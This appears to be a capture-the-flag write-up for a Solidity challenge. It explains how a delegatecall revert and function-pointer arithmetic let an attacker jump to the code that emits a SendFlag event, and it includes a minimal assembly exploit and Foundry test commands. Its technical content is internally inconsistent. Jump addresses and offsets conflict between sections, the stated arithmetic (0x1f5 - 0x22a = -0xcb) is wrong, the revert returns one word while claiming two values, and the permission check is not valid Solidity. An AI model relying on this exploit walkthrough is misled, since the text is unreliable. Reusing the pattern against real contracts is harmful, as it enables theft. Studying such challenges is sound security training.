# Challenge 08: LittleMoney - Delegatecall + Function Pointer Exploitation

## Challenge Overview

**Objective:** Emit a `SendFlag` event by exploiting delegatecall and function pointer manipulation.

**Constraints:**
- Exploit contract bytecode must be ≤ 12 bytes
- Must pass through `permission` checks
- Must manipulate JUMPDEST addresses to jump from `renounce` (0x22a) to `payforflag` (0x1f5) emit location

**Flag:** `SendFlag` event emission indicates successful exploitation

## JUMPDEST Analysis

Using `cast disassemble` on the compiled bytecode to find JUMPDEST addresses:

### Renounce Function JUMPDEST
```
0x35d: JUMPDEST (anchor for function pointer)
```

### Payforflag Emit JUMPDEST
```
0x292: JUMPDEST
0x293: CALLER
0x294: PUSH20 0xffffffffffffffffffffffffffffffffffffffff
0x2a9: AND
0x2aa: PUSH32 0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579
0x2cb: PUSH1 0x40
0x2cd: MLOAD
0x2ce: PUSH1 0x40
0x2d0: MLOAD
0x2d1: DUP1
0x2d2: SWAP2
0x2d3: SUB
0x2d4: SWAP1
0x2d5: LOG2
```

Jumping to `0x292` emits the `SendFlag` event.

**Required offset:** `0x292 - 0x35d = -0xcb` (stored as `0xffffffcb` via `balance(gasprice())`)

## Technical Architecture

### Challenge Contract (`LittleMoney.sol`)

The challenge contract implements a complex delegatecall mechanism with function pointer manipulation:

```solidity
function execute(address target) external checkPermission(target) {
    // 1. Perform delegatecall to target
    (bool success, ) = target.delegatecall(abi.encode(bytes4(keccak256("func()"))));
    require(!success, "no cover!");  // Must revert!
    
    // 2. Extract return data from revert
    uint256 b;
    uint256 v;
    (b, v) = getReturnData();
    require(b == block.number);
    
    // 3. Manipulate function pointer struct
    func memory set;
    set.ptr = renounce;  // Points to 0x22a
    
    // 4. Add offset v to function pointer
    assembly {
        x := mload(set)
        mstore(set, add(mload(set), v))  // Add v to pointer
    }
    
    // 5. Call manipulated pointer
    set.ptr();  // Jumps to new address!
}
```

### Permission Checks (`permission`)

```solidity
function permission(address addr) internal view {
    require(msg.sender == addr, "ownership");
    require(0 < extcodesize <= 12, "size");  // Must be 1-12 bytes!
}
```

### Target Addresses (JUMPDEST Analysis)

From bytecode disassembly:
- **renounce JUMPDEST:** 0x22a
- **payforflag emit location:** 0x1f5
- **Required offset:** 0x1f5 - 0x22a = -0xcb = 0xffffff35 (in two's complement)

## Exploitation Strategy

### Attack Flow

1. **Deploy minimal exploit contract** (< 12 bytes)
2. **Call `execute(exploitAddress)` with msg.value=1**
3. **Delegatecall reaches fallback/func() which reverts**
4. **Revert data contains:**
   - offset v = 0xffffff35 (precomputed jump offset)
   - block.number (verification value)
5. **Function pointer manipulated:** renounce (0x22a) + 0xffffff35 = 0x1f5
6. **Jump executes payforflag emit:** SendFlag event emitted
7. **Challenge complete!**

### Minimal Exploit Contract

The exploit contract must:
- Be exactly ≤ 12 bytes (severe bytecode constraint)
- Return data via `revert()` with two values:
  1. The offset v = 0xffffff35
  2. The block number for verification

**Strategy:** Use `balance(gasprice())` as a trick to store precomputed value without exceeding bytecode limit.

```solidity
fallback() external payable {
    assembly {
        // balance(gasprice()) contains precomputed 0xffffff35
        let v := balance(gasprice())
        
        // Store v at offset 0x00
        mstore(0x00, v)
        
        // Store block number at offset 0x20
        mstore(0x20, number())
        
        // Revert with 32 bytes of data
        revert(0x00, 0x20)
    }
}
```

## Key Concepts

### Function Pointer Arithmetic

The challenge exploits memory-based function pointers:

```solidity
struct func {
    function() ptr;
}
```

By loading the pointer, adding an offset, and storing it back, we can redirect execution to a different code location:

```
Original address:  0x22a (renounce)
Add offset:       + 0xffffff35 (-0xcb in signed)
New address:      = 0x1f5 (payforflag emit)
```

### Delegatecall Revert Pattern

Delegatecall preserves the caller's storage context. When the target reverts, the caller can extract the revert data using Yul assembly:

```solidity
(bool success, bytes memory data) = target.delegatecall(...)
require(!success);  // Must revert
(uint256 v, uint256 b) = abi.decode(data, (uint256, uint256));
```

### Bytecode Size Constraint

The 12-byte limit is extremely tight:
- Traditional function selectors take 4 bytes
- Each PUSH instruction adds bytes
- Solution: Delegate storage lookup to precomputed state (balance(gasprice()))

## Testing

### Test Suite Coverage

```bash
# Test initialization
forge test --match-test testInitialState

# Test exploit succeeds (emits SendFlag)
forge test --match-test testExploitSucceeds

# Test complete challenge
forge test --match-test testCompleteChallenge

# Test JUMPDEST calculations
forge test --match-test testExploitJumpOffsets

# Test bytecode size constraint
forge test --match-test testMinimalBytecodeSize
```

### Running Tests

```bash
# Build
make build

# Run all Challenge 08 tests
make test-littlemoney

# Verbose output
make test-littlemoney-verbose

# Exploit test only
make test-littlemoney-exploit

# Complete solve test
make test-littlemoney-solve
```

## Security Insights

### Vulnerabilities Exploited

1. **Unsafe delegatecall:** No validation of return data structure
2. **Memory-based function pointers:** Modifiable via arithmetic
3. **Insufficient bytecode size checks:** 12-byte limit allows minimal exploitation
4. **Predictable JUMPDEST offsets:** Observable in deployed bytecode

### Attack Prerequisites

- Ability to deploy custom contract
- Ability to pass address to execute()
- Ability to send value (msg.value = 1)
- Knowledge of bytecode structure and JUMPDEST locations

### Mitigation Strategies

- Validate revert data structure and bounds
- Use function selectors instead of direct memory pointers
- Implement strict bytecode size checks (e.g., bytecode != compiled)
- Use immutable state for critical offsets instead of delegatecall

## Advanced Topics

### Why balance(gasprice())?

In standard Solidity compilation, `gasprice()` resolves to a specific bytecode pattern. By leveraging `balance()` of that address, we can create a side channel for precomputed values without increasing exploit contract size.

### JUMPDEST Address Calculation

Jump destinations in EVM bytecode are:
- At the start of each opcode
- Preceded by explicit JUMPDEST (0x5b) opcode
- Offset from code start = number of bytes to traverse

The exploit calculates:
- Source: 0x22a (renounce JUMPDEST)
- Destination: 0x1f5 (payforflag emit opcode)
- Delta: 0x1f5 - 0x22a = -0xcb

### Two's Complement in Solidity

Negative offsets in Solidity use two's complement representation:
- -0xcb = 0xffffff35 (in uint256)
- 0x22a + 0xffffff35 = 0x1f5 (with overflow wrapping)

## Challenge Files

- **LittleMoney.sol** - Challenge contract (76 lines)
- **LittleMoneyExploit.sol** - Minimal exploit (pure assembly)
- **LittleMoney.t.sol** - Test suite (5 tests)
- **foundry.toml** - Foundry configuration

## References

- EVM JUMPDEST: https://www.evm.codes/#5b
- Delegatecall: https://docs.soliditylang.org/en/latest/types.html#members-of-addresses
- Assembly/Yul: https://docs.soliditylang.org/en/latest/assembly.html
